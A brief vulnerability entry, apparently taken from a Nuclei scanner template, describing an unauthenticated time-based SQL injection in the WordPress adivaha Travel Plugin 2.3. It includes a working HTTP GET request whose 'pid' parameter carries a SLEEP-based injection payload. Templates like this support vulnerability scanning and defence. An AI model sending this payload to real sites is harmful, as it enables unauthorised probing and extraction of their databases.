# Vulnerability: WordPress adivaha Travel Plugin 2.3 - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`wp-adivaha-sqli.yaml`)

## Description
An unauthenticated Time-Based SQL injection found in adivaha Travel Plugin 2.3 allows a remote attacker to retrieve the contents of an entire database.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 25s
GET /mobile-app/v3/?pid='+AND+(SELECT+6398+FROM+(SELECT(SLEEP(7)))zoQK)+AND+'Zbtn'='Zbtn&isMobile=chatbot HTTP/1.1
Host: {{Hostname}}
```

